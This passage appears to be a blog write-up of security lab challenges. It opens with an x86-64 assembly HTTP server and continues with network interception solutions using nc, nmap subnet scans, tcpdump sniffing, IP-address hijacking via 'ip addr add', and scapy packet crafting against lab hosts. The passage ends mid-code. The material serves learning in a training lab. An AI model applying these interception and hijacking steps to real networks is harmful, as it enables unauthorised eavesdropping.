class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><code class="hljs X86ASM"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta"></span><br><span class="hljs-meta">.globl</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta">.text</span><br><br>#============================================<br># function<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">call</span> main<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span>     # SYS_exit<br>    <span class="hljs-keyword">syscall</span><br><br>#============================================<br># function<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]     listen_fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]    accept_fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]    fork_fd<br><span class="hljs-symbol">main:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x18</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span>     # SYS_socket<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rax</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, sockaddr_in<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span>     # SYS_bind<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span>     # SYS_listen<br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">main_loop:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span>     # SYS_accept<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>], <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # SYS_fork<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>], <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> main_subprocess<br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">jmp</span> main_loop<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">main_subprocess:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">call</span> process<br><br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br># process(<span class="hljs-keyword">int</span> fd)<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]         fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]       request<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]       file_path<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]       file_fd<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc10</span>]       file_data<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>]       file_data_len<br># [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>]       data_addr<br><span class="hljs-symbol">process:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0xc20</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span>       # SYS_read<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">call</span> get_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-string">&#x27;G&#x27;</span><br>    <span class="hljs-keyword">je</span> process_get<br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-string">&#x27;P&#x27;</span><br>    <span class="hljs-keyword">je</span> process_post<br>    <span class="hljs-keyword">jmp</span> process_error<br><span class="hljs-symbol">process_get:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span> ,<span class="hljs-number">2</span>       # SYS_open<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span>       # SYS_read<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, reponse<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol">process_post:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x408</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x0a0d0a0d</span><br>    <span class="hljs-keyword">jne</span> process_post<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x808</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">65</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0777</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>    # SYS_open<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>]<br>    <span class="hljs-keyword">call</span> strlen<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc20</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0xc18</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x810</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span>      # SYS_close<br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, reponse<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>      # SYS_write<br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-symbol">process_error:</span><br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br># <span class="hljs-keyword">int</span> get_path(char *read_request,char *open_path,size_t len)<br><span class="hljs-symbol">get_path:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x28</span><br><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>], <span class="hljs-built_in">rdi</span>                  # read_request<br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>], <span class="hljs-built_in">rsi</span>                 # open_path<br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>], <span class="hljs-built_in">rdx</span>                 # len<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>], <span class="hljs-number">0</span>         # index_read<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>], <span class="hljs-number">0</span>         # index_open<br><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_path_loop0:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]<br>    <span class="hljs-keyword">jnb</span> get_path_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>], <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">jne</span> get_path_loop0<br><span class="hljs-symbol">get_path_loop1:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x18</span>]<br>    <span class="hljs-keyword">jnb</span> get_path_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>], <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">je</span> get_path_end<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-built_in">rcx</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>], <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">jmp</span> get_path_loop1<br><span class="hljs-symbol">get_path_end:</span>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x28</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>], <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br># size_t strlen(char *src)<br><span class="hljs-symbol">strlen:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">strlen_loop:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-built_in">rax</span>]<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">jne</span> strlen_loop<br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">leave</span><br>    <span class="hljs-keyword">ret</span><br><br>#============================================<br><span class="hljs-meta"></span><br><span class="hljs-meta">.data</span><br><span class="hljs-symbol">sockaddr_in:</span><br><span class="hljs-meta">    .short</span> <span class="hljs-number">2</span>        # sin_family<br><span class="hljs-meta">    .short</span> <span class="hljs-number">0x5000</span>   # sin_port<br><span class="hljs-meta">    .long</span> <span class="hljs-number">0</span>         # sin_addr<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">8</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">reponse:</span><br><span class="hljs-meta">    .string</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="intercepting-communication"><a href="#intercepting-communication" class="headerlink" title="intercepting-communication"></a>intercepting-communication</h2><h3 id="challenges-1"><a href="#challenges-1" class="headerlink" title="challenges"></a>challenges</h3><p>In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.</p><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><blockquote><p>Connect to a remote host</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 10.0.0.3 31337</span><br></code></pre></td></tr></table></figure><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><blockquote><p>Listen for a connection from a remote host</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc -l -p 31337</span><br></code></pre></td></tr></table></figure><h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><blockquote><p>Find and connect to a remote host</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">The remote host is somewhere on the `10.0.0.0/24` subnetwork, listening on port `31337`.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmap -v 10.0.0.0/24 -p 31337</span><br></code></pre></td></tr></table></figure><h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h4><blockquote><p>Find and connect to a remote host on a large network</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">The remote host is somewhere on the `10.0.0.0/16` subnetwork, listening on port `31337`.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmap -v 10.0.0.0/16 -p 31337 -T5</span><br><br>65536 IP addresses (2 hosts up) scanned in 2612.03 seconds<br></code></pre></td></tr></table></figure><h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h4><blockquote><p>Monitor traffic from a remote host</p></blockquote><p>In this challenge you will monitor traffic from a remote host.<br>Your host is already receiving traffic on port <code>31337</code>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tcpdump -A</span><br></code></pre></td></tr></table></figure><h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h4><blockquote><p>Monitor slow traffic from a remote host</p></blockquote><p>In this challenge you will monitor slow traffic from a remote host.<br>Your host is already receiving traffic on port <code>31337</code>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tcpdump -Q <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;tcp[tcpflags]&amp;tcp-push!=0&quot;</span> -X -q -l | grep 0x0030</span><br></code></pre></td></tr></table></figure><p>or you can use wireshark</p><h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><blockquote><p>Hijack traffic from a remote host by configuring your network interface</p></blockquote><p>In this challenge you will hijack traffic from a remote host by configuring your network interface.<br>The remote host at <code>10.0.0.4</code> is communicating with the remote host at <code>10.0.0.2</code> on port <code>31337</code>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr add 10.0.0.2/16 dev eth0</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc -l 31337</span><br></code></pre></td></tr></table></figure><h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><blockquote><p>Manually send an Ethernet packet</p></blockquote><p>In this challenge you will manually send an Ethernet packet.<br>The packet should have <code>Ether type=0xFFFF</code>.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scpay<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;06:3f:d7:4f:63:40&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;06:3f:d7:4f:63:40&quot;</span>,dst=<span class="hljs-string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-number">0xFFFF</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>srp(pk,iface=<span class="hljs-string">&quot;eth0&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><blockquote><p>Manually send an Internet Protocol packet</p></blockquote><p>In this challenge you will manually send an Internet Protocol packet.<br>The packet should have <code>IP proto=0xFF</code>.<br>The packet should be sent to the remote host at <code>10.0.0.3</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">$ scapy<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_list()<br>[<span class="hljs-string">&#x27;lo&#x27;</span>, <span class="hljs-string">&#x27;eth0&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>get_if_hwaddr(<span class="hljs-string">&quot;eth0&quot;</span>)<br><span class="hljs-string">&#x27;d6:8e:5a:63:78:a2&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>pk=Ether(src=<span class="hljs-string">&quot;d6:8e:5a:63:78:a2&quot;</span>,dst=<span 